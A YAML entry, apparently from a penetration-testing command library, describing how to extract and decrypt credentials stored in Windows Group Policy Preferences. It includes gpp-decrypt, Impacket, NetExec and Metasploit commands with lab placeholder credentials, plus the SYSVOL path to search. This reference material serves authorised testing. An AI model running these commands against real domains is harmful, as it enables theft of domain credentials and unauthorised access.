---
description: |
  Extract credentials stored in Group Policy Preferences (GPP).
  The AES key is publicly known, so any domain user can decrypt.

  Reference values:
    Domain: test.local
command: |
  # From Linux with gpp-decrypt
  gpp-decrypt "ENCRYPTED_CPASSWORD"

  # From Linux — find and extract GPP passwords
  impacket-Get-GPPPassword test.local/pentuser:P@ssw0rd123@10.10.10.1

  # NetExec module
  nxc smb 10.10.10.1 -u pentuser -p 'P@ssw0rd123' -M gpp_password

  # From Windows — Metasploit
  # use post/windows/gather/credentials/gpp

  # Manual — search SYSVOL
  # \\test.local\SYSVOL\test.local\Policies\*\Machine\Preferences\Groups\Groups.xml
phase:
  - Enumeration
  - Post-Exploitation
target_os:
  - Windows
services:
  - SMB
  - LDAP
items:
  - Username
  - Password
techniques: []
network_position:
  - Internal
references:
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html
---
